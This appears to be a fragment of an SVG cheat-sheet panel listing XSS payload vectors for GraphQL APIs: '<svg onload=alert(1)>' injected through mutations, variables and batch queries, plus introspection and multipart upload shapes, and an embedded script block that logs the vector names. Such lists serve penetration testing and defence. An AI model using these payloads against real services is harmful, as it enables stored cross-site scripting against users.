  <!-- =====================================================================
       GRAPHQL
       ===================================================================== -->
  <g transform="translate(10, 210)">
    <rect class="api" width="380" height="220" rx="5"/>
    <text class="title" x="10" y="25">📊 GRAPHQL SVG XSS</text>

    <text class="text" x="10" y="45">Mutation Input Injection:</text>
    <text class="text" x="10" y="60" font-size="8">mutation { updateProfile(bio: "<svg onload=alert(1)>") { id } }</text>

    <text class="text" x="10" y="80">Variable Injection:</text>
    <text class="text" x="10" y="95" font-size="8">{"query": "mutation($bio: String!) { updateProfile(bio: $bio) }", "variables": {"bio": "<svg onload=alert(1)>"}}</text>

    <text class="text" x="10" y="115">Introspection Bypass:</text>
    <text class="text" x="10" y="130" font-size="8">{__schema { types { name fields { name } } }}</text>

    <text class="text" x="10" y="150">Batch Query (Multiple):</text>
    <text class="text" x="10" y="165" font-size="8">[{query: "mutation { a(bio: '<svg onload=1>') }"}, {query: "mutation { c(bio: '<svg onload=2>') }}]</text>

    <text class="text" x="10" y="185">File Upload (GraphQL Multipart):</text>
    <text class="text" x="10" y="200" font-size="8">operations: {mutation: "upload(file: $f)", variables: {f: null}} map: {f: ["variables.file"]}</text>

    <foreignObject x="200" y="40" width="170" height="170">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>
          console.log('GraphQL SVG XSS Vectors:');
          console.log('1. Mutation string input');
          console.log('2. Variables JSON injection');
          console.log('3. Introspection for schema');
          console.log('4. Batch queries for mass XSS');
          console.log('5. Multipart file upload');
        </script>
      </body>
    </foreignObject>
  </g>

